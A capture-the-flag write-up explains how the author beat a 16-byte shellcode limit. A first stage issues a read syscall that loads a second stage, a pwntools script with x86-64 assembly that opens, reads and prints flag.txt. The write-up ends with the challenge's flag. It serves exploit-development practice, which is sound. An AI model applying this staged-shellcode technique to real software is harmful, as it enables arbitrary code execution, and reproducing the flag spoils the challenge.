## `CPSC233 Assignment 3`
### Problem Description
- Author: aynakeya
    - CPSC233 Assignment 3 Instruction
    - Practice shellcode writing with length limit.
    - (seems like anti-cheat didn't work properly, we've removed it from our system)

### Solution
Now we *only* get 16 bytes for our function. We can't do what we did in A2 anymore....or can we?

This took me significantly longer to figure out, because I did one step more than I actually needed to do....

![](https://cdn.frankerfacez.com/emoticon/510861/4)

Anyway, we can actually get around the 16 byte restriction by doing....*another* `read` from `stdin`, from which we can write arbitrarily long functions. However, we need to `read` into the address immediately after the `syscall`, which wasn't too hard to figure out (`0x233300f`).

```python
io = start()
shellcode = asm(shellcraft.read(0, 0x233300f, 0x1000))
...
io.sendlineafter(b"here: ", shellcode.hex().encode())
```

After this, we can write whatever we want:

```python
your_asm_code_here = """
sub rsp, 9 # open
movabs rax, 0x7478742e67616c66 # "flag.txt"
mov QWORD PTR [rsp], rax # write that to the stack
mov BYTE PTR [rsp+8], 0x0 # null termination!
mov rax, 2 # open
mov rdi, rsp # address of fp is rsp :)
mov rsi, 0
syscall
add rsp, 9 # restore the stack

mov rdi, rax # copy fd
mov r8, rdi # save fd to close later
mov rax, 0 # read
sub rsp, 0x400 # allocate space on the stack
mov rsi, rsp # buffer
mov rdx, 1024
syscall

mov rdx, rax # read returns how many bytes is read, move this into arg for write
mov rax, 1 # write
mov rdi, 1 # stdout
mov rsi, rsp # buffer
syscall

add rsp, 0x400 # restore stack
mov rdi, r8 # restore fd into rdi
mov rax, 3 # close
syscall

ret
"""
shellcode2 = asm(your_asm_code_here)
io.sendline(shellcode2)
io.recvline()
print(io.recvline()[:-15].decode())
io.close()
```

### Flag: `maple{r34d_5h3llc0d3_u51n6_5h3llc0d3}`